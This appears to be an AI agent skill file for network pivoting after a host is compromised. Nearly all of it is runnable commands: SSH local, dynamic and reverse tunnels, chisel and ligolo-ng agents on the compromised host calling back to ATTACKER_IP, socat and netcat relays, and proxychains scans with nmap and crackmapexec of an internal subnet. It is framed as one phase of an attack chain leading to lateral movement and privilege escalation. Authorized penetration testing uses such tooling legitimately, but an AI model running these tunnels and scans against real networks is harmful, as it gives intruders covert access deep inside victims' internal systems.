---
name: post-pivoting
description: "Network pivoting skill for post-exploitation — SSH tunneling, SOCKS proxy, chisel, ligolo-ng, socat port forwarding, double pivot, rpivot. Triggers: 'pivoting', 'network pivot', 'tunnel', 'socks proxy', 'ssh tunnel', 'port forwarding', 'chisel', 'ligolo', 'rpivot', 'double pivot', 'internal network access'."
---

# Network Pivoting

Tunnel traffic through a compromised host to reach internal network segments.

---

## Phase 1: SSH Tunneling

```bash
JUMP_HOST="COMPROMISED_HOST"
JUMP_USER="ubuntu"
JUMP_KEY="~/.ssh/id_rsa"

ssh -L 8080:10.0.0.10:80 -N -i $JUMP_KEY $JUMP_USER@$JUMP_HOST &
curl -s http://localhost:8080/

ssh -D 1080 -N -i $JUMP_KEY $JUMP_USER@$JUMP_HOST &

echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT -p 22,80,443,8080 10.0.0.0/24

ssh -R 4444:localhost:4444 -N -i $JUMP_KEY $JUMP_USER@$JUMP_HOST &

ssh -L 8080:10.0.0.10:3389 -N -i $JUMP_KEY $JUMP_USER@$JUMP_HOST &  # Jump1 → internal RDP
```

---

## Phase 2: Chisel (HTTP Tunneling)

```bash
CHISEL="/opt/chisel"

$CHISEL server -p 8080 --reverse &

./chisel client ATTACKER_IP:8080 R:socks &

proxychains curl http://10.0.0.10/

$CHISEL server -p 8080 --reverse &

./chisel client ATTACKER_IP:8080 R:3306:127.0.0.1:3306 &

```

---

## Phase 3: Ligolo-ng

```bash

./proxy -selfcert -laddr 0.0.0.0:11601 &

./agent -connect ATTACKER_IP:11601 -ignore-cert

```

---

## Phase 4: Socat & Netcat Forwarding

```bash
INTERNAL_HOST="10.0.0.10"
INTERNAL_PORT="80"
LOCAL_PORT="8080"

socat TCP-LISTEN:$LOCAL_PORT,fork TCP:$INTERNAL_HOST:$INTERNAL_PORT &

mkfifo /tmp/pipe
nc -lvnp $LOCAL_PORT < /tmp/pipe | nc $INTERNAL_HOST $INTERNAL_PORT > /tmp/pipe &

```

---

## Phase 5: Internal Discovery via Pivot

```bash
proxychains nmap -sT -p 21,22,25,80,443,445,3306,3389,5432,8080 10.0.0.0/24 2>/dev/null | tee output/internal_scan.txt
proxychains curl -s http://10.0.0.10/ | head -20
proxychains crackmapexec smb 10.0.0.0/24 2>/dev/null
```

---

## Output

Save to `output/`:
- `internal_scan.txt` — internal network port scan results
- `pivot_diagram.txt` — tunneling chain documentation

## Next Phase

→ `red-lateral` for lateral movement techniques
→ `post-linux-privesc` or `post-windows-privesc` for local privesc
